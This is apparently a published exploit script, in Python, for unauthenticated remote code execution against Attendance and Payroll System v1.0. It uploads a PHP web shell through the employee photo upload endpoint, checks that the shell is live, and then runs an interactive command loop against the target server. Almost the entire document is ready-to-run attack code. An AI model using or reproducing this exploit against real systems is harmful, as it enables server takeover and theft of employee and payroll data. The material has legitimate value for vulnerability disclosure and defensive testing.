# Exploit Title: Attendance and Payroll System v1.0 - Remote Code Execution (RCE)
# Date: 04/03/2022
# Exploit Author: pr0z
# Vendor Homepage: https://www.sourcecodester.com
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/apsystem.zip
# Version: v1.0
# Tested on: Linux, MySQL, Apache

import requests
import sys
from requests.exceptions import ConnectionError

# Interface class to display terminal messages
class Interface():
    def __init__(self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> Attendance and Payroll System v1.0')
        print('    >> Unauthenticated Remote Code Execution')
        print('    >> By pr0z\n')

    def info(self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning(self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error(self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success(self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")


upload_path = '/apsystem/admin/employee_edit_photo.php'
shell_path = '/apsystem/images/shell.php'
#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

shell_data = "<?php if(isset($_REQUEST['cmd'])){ $cmd = ($_REQUEST['cmd']); system($cmd);}?>"

multipart_form_data = {
    'id': 1,
    'upload': (''),
}

files = {'photo': ('shell.php', shell_data)}

output = Interface()
output.header()

# Check for arguments
if len(sys.argv) < 2 or '-h' in sys.argv:
    output.info("Usage: python3 rce.py http://127.0.0.1")
    sys.exit()

# Upload the shell
target = sys.argv[1]
output.info(f"Uploading the web shell to {target}")
r = requests.post(target + upload_path, files=files, data=multipart_form_data, verify=False)

# Validating shell has been uploaded
output.info(f"Validating the shell has been uploaded to {target}")
r = requests.get(target + shell_path, verify=False)
try:
    r = requests.get(target + shell_path)
    if r.status_code == 200:
        output.success('Successfully connected to web shell\n')
    else:
        raise Exception
except ConnectionError:
    output.error('We were unable to establish a connection')
    sys.exit()
except:
    output.error('Something unexpected happened')
    sys.exit()

# Remote code execution
while True:
    try:
        cmd = input("\033[91mRCE\033[0m > ")
        if cmd == 'exit':
            raise KeyboardInterrupt
        r = requests.get(target + shell_path + "?cmd=" + cmd, verify=False)
        if r.status_code == 200:
            print(r.text)
        else:
            raise Exception
    except KeyboardInterrupt:
        sys.exit()
    except ConnectionError:
        output.error('We lost our connection to the web shell')
        sys.exit()
    except:
        output.error('Something unexpected happened')
        sys.exit()